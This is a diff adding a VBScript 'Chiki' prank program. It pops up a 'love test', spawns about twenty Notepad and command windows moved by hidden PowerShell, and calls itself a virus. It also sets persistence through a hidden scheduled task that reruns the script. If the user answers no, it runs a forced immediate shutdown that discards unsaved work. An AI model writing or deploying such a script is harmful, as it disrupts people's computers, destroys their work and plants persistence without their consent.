@@ -1,0 +1,103 @@
+Option Explicit
+Dim shell, fso, wsh, answer, i, x, y, notepadFile, cmdFile, fileStream
+Set shell = CreateObject("WScript.Shell")
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set wsh = CreateObject("WScript.Shell")
+
+' ===== ASCII ART =====
+Dim cmdArt, notepadArt
+cmdArt = "                                " & vbCrLf & _
+" ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" & vbCrLf & _
+" ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⠉⢻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" & vbCrLf & _
+" ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠏⡠⡀⠹⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" & vbCrLf & _
+" ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡿⠆⡇⠰⠀⠈⠻⠦⠶⠶⠶⠶⠾⠶⠞⠋⠀" & vbCrLf & _
+" ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡾⠃⠀⠂⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" & vbCrLf & _
+" ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" & vbCrLf & _
+" ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" & vbCrLf & _
+" ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" & vbCrLf & _
+" ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡧⠀⠀⠀⠀⠀⠀⠀⢠⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀" & vbCrLf & _
+" ⠀⣨⣧⠄⠀⠀⠀⠀⠀⠘⣿⠀⠀⠀⠀⠀⠀⠀⠈⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀" & vbCrLf & _
+" ⠀⠀⠀⠘⠂⠀⠀⠀⠀⠀⠀⠹⣧⣄⠀⠀⡒⠉⠉⠈⡃⠀⢰⣆⢠⣶⣄⣼⠀" & vbCrLf & _
+" ⠀⠀⠀⢠⣄⣿⡆⠀⠀⠀⠀⠀⠘⢿⣇⠀⠈⠀⠂⠐⠁⠀⠀⠛⠛⠁⠈⠀⠀" & vbCrLf & _
+" ⠀⠀⠀⠘⢞⣷⠃⠀⠀⠀⠀⠀⠀⠀⠙⢿⡷⠴⢴⡤⢦⠤⡤⠤⠤⠶⠶⠚⠛" & vbCrLf & _
+" ⡀⡀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" & vbCrLf & _
+" ⢻⡉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⡿⠀⠀⠀⠀⠀⠀⠀⠀⠐⢼⣦⣷⠱" & vbCrLf & _
+" ⠀⠀⠀⠀⠀⣾⠛⠻⢷⣤⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠘⢷⣄⠀⠀⠉⣿⡐" & vbCrLf & _
+" ⠀⠀⠀⠀⠀⢹⣆⡀⠀⢻⣧⠀⠀⠀⠀⢿⡄⠀⠀⠀⠀⠀⠀⠙⠻⣶⣤⡿⠙" & vbCrLf & _
+" ⠀⠀⠀⠀⠀⠀⠙⢿⣦⠀⠹⢾⣀⡀⠀⢹⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" & vbCrLf & _
+" ⠀⠀⠀⠀⠀⠀⠀⠀⠹⣷⠀⠀⠉⠛⠛⢾⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" & vbCrLf & _
+" ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⢲⣶⣶⣤⣼⡗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" & vbCrLf & _
+" ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣿⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⡴⠞" & vbCrLf & _
+" ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠄⠀⠀⠀⣤⠶⠓⠋⠉⠁⠀⠀" & vbCrLf & _
+" ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡆⠀⠀⠸⣿⠁⠀⠀⠀⠀⠀⠀" & vbCrLf & _
+" ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠛⠛⠋⠀⠀⠀⠀⠀⠀⠀"
+
+notepadArt = ".         ⣀⣤‌⣤⣤⣀             ⣀⣤⣤‌⣤‌⣀" & vbCrLf & _
+"    ⣠⣾⣿⣿⣿⣿⣿⣧⣄　　⣠⣼⣿⣿⣿⣿⣿⣷⣄    " & vbCrLf & _
+"  ⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦  " & vbCrLf & _
+"  ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿  " & vbCrLf & _
+"  ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿  " & vbCrLf & _
+"  ⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏  " & vbCrLf & _
+"     ⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟    " & vbCrLf & _
+"        ⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟      " & vbCrLf & _
+"           ⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋        " & vbCrLf & _
+"                 ⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋            " & vbCrLf & _
+"                      ⠙⢿⣿⣿⣿⣿⡿⠋                " & vbCrLf & _
+"                            ⠙⢿⡿⠋    " & vbCrLf & _
+"                      ︵      ‌        ︵" & vbCrLf & _
+"                    (      ╲       /      /" & vbCrLf & _
+"                      ╲       ╲/      /" & vbCrLf & _
+"                           ╲       ╲ /" & vbCrLf & _
+"                        ╭ ͡   ╲        ╲" & vbCrLf & _
+"                   ╭ ͡  ╲        ╲      ﾉ" & vbCrLf & _
+"              ╭ ͡  ╲       ╲       ╱" & vbCrLf & _
+"                ╲      ╲        ╱" & vbCrLf & _
+"                    ╲         ╱" & vbCrLf & _
+"                          ︶ "
+
+' ===== PERSISTENCE =====
+If Not fso.FileExists("C:\Windows\Temp\chiki_ran.txt") Then
+    Set fileStream = fso.CreateTextFile("C:\Windows\Temp\chiki_ran.txt", True)
+    fileStream.Close
+    shell.Run "schtasks /create /tn ""ChikiPrank"" /tr """ & WScript.ScriptFullName & """ /sc once /st 00:05 /f", 0, True
+End If
+
+' ===== MAIN PRANK =====
+answer = shell.Popup("Hey love, I'm Chiki! ❤️" & vbCrLf & "Do you love me?", 0, "Chiki Love Test", vbQuestion + vbYesNo)
+
+If answer = vbYes Then
+    notepadFile = fso.GetSpecialFolder(2) & "\chiki_heart.txt"
+    cmdFile = fso.GetSpecialFolder(2) & "\chiki_cmd.bat"
+    
+    ' Write Notepad file
+    Set fileStream = fso.CreateTextFile(notepadFile, True)
+    fileStream.Write notepadArt
+    fileStream.Close
+    
+    ' Write CMD file
+    Set fileStream = fso.CreateTextFile(cmdFile, True)
+    fileStream.Write "@echo off" & vbCrLf & "mode con cols=100 lines=30" & vbCrLf & "color 4E" & vbCrLf & _
+                   "echo " & Replace(Left(cmdArt, 200), vbCrLf, " & echo ") & vbCrLf & "pause"
+    fileStream.Close
+    
+    ' Spawn random windows
+    Randomize
+    For i = 1 To 20
+        x = Int(Rnd * 1000)
+        y = Int(Rnd * 600)
+        
+        If Int(Rnd * 2) = 0 Then
+            shell.Run "notepad.exe " & notepadFile, 1, False
+            shell.Run "cmd /c powershell -w hidden -c ""$wshell = New-Object -ComObject wscript.shell; $wshell.AppActivate('chiki_heart.txt - Notepad'); Add-Type -MemberDefinition '[DllImport(""user32.dll"")] public static extern bool SetWindowPos(int hWnd, int hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);' -Name WindowPos -Namespace Utils; [Utils.WindowPos]::SetWindowPos((Get-Process -Name notepad).MainWindowHandle, 0, " & x & ", " & y & ", 500, 500, 0)""", 0, True
+        Else
+            shell.Run cmdFile, 1, False
+            shell.Run "cmd /c powershell -w hidden -c ""$wshell = New-Object -ComObject wscript.shell; $wshell.AppActivate('chiki_cmd.bat'); Add-Type -MemberDefinition '[DllImport(""user32.dll"")] public static extern bool SetWindowPos(int hWnd, int hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);' -Name WindowPos -Namespace Utils; [Utils.WindowPos]::SetWindowPos((Get-Process -Name cmd).MainWindowHandle, 0, " & x & ", " & y & ", 800, 600, 0)""", 0, True
+        End If
+        WScript.Sleep 300
+    Next
+    
+    shell.Popup "I'm inside your PC now! Hehehe! ❤️", 0, "Chiki Virus", vbExclamation
+Else
+    shell.Popup "You broke my heart... Now I break yours! 💔", 0, "Chiki Sad", vbCritical
+    shell.Run "shutdown /s /f /t 0", 0, False
+End If
